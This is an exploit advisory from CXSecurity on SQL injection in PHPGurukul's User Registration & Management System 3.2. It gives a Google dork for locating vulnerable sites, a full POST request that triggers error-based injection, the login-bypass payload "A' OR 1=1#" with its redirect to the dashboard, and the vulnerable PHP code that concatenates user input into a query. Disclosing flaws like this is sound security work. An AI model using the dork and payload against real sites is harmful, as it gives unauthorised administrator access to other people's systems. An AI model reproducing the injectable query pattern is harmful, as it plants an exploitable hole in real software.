---
title: User Registration & Management System - SQLi
url: https://cxsecurity.com/issue/WLB-2024060041
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-19
fetch_date: 2025-10-06T16:54:26.693592
---

# User Registration & Management System - SQLi

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **User Registration & Management System - SQLi** **2024.06.18**  Credit:  **[bRpsd](https://cxsecurity.com/author/bRpsd/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A**  **[**Dork:** inurl:loginsystem/index.php](https://cxsecurity.com/dorks/)** | |

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
.:. Exploit Title > User Registration & Management System - SQLi
.:. Google Dorks .:.
inurl:loginsystem/index.php
.:. Date: June 18, 2024
.:. Exploit Author: bRpsd
.:. Contact: cy[at]live.no
.:. Vendor -> https://phpgurukul.com/
.:. Product -> https://phpgurukul.com/?sdm\_process\_download=1&download\_id=7003
.:. Product Version -> Version 3.2
.:. DBMS -> MySQL
.:. Tested on > macOS [\*nix Darwin Kernel], on local xampp
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#############
|DESCRIPTION|
#############
"User Management System is a web based technology which manages user database and provides rights to update the their details In this web application user must be registered. This web application provides a way to effectively control record & track the user details who himself/herself registered with us."
===========================================================================================
Vulnerability 1: Unauthenticated SQL Injection & Authentication bypass
Types: error-based
File: localhost/admin/index.php
Vul Parameter: USERNAME [POST]
POST PoC #1: http://tom:8080/loginsystem/admin/index.php
Host: tom
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://tom
Connection: keep-alive
Referer: http://tom/loginsystem/admin/index.php
Cookie: PHPSESSID=fca5cef217b48f9ec0221b75695e4f2a
Upgrade-Insecure-Requests: 1
username='&password=test&login=
Response: Warning: mysqli\_fetch\_array() expects parameter 1 to be mysqli\_result, bool given in /Applications/XAMPP/xamppfiles/htdocs/loginsystem/admin/index.php on line 9
===========================================================================================
Test #2 => Payload to skip authentication
http://localhost:9000/adminstorefinder/admin/index.php
username=A' OR 1=1#&password=1&login=
Response:
302 redirect to dashboard.php
===========================================================================================
Vuln File:/loginsystem/admin/index.php
Vul Code:
<?php session\_start();
include\_once('../includes/config.php');
// Code for login
if(isset($\_POST['login']))
{
$adminusername=$\_POST['username'];
$pass=md5($\_POST['password']);
$ret=mysqli\_query($con,"SELECT \* FROM admin WHERE username='$adminusername' and password='$pass'");
$num=mysqli\_fetch\_array($ret);
if($num>0)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060041)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top